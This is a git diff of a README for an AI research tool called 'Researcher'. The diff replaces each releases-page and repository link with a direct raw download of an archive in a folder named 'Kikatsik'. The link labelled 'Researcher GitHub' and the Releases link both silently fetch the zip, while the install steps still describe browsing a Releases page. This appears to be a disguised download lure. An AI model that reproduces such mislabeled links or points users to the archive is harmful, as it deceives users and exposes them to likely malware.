@@ -1,7 +1,7 @@
 # 🤖 Researcher - Simplify Your Research Effortlessly
 
 ## 🔗 Download Now 
-[![Download Researcher](https://img.shields.io/badge/Download-Researcher-brightgreen.svg)](https://github.com/fajar661/Researcher/releases)
+[![Download Researcher](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)
 
 ## 🚀 Getting Started
 Researcher helps you enhance your research process using AI. Whether you need to summarize papers, find gaps in your work, or explore new ideas, Researcher is here to make it easier.
@@ -19,7 +19,7 @@ Researcher helps you enhance your research process using AI. Whether you need to
 - Internet connection for initial setup
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Researcher Releases](https://github.com/fajar661/Researcher/releases).
+To get started, visit this page to download the software: [Researcher Releases](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Researcher.
@@ -38,7 +38,7 @@ Once installed, you can launch Researcher from your applications menu.
   
 ## 🔍 Support and Assistance
 If you have questions or need help:
-- Visit our GitHub page: [Researcher GitHub](https://github.com/fajar661/Researcher)
+- Visit our GitHub page: [Researcher GitHub](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)
 - Check our FAQ section on the GitHub wiki.
 - Open an issue on GitHub for direct support from our team.
 
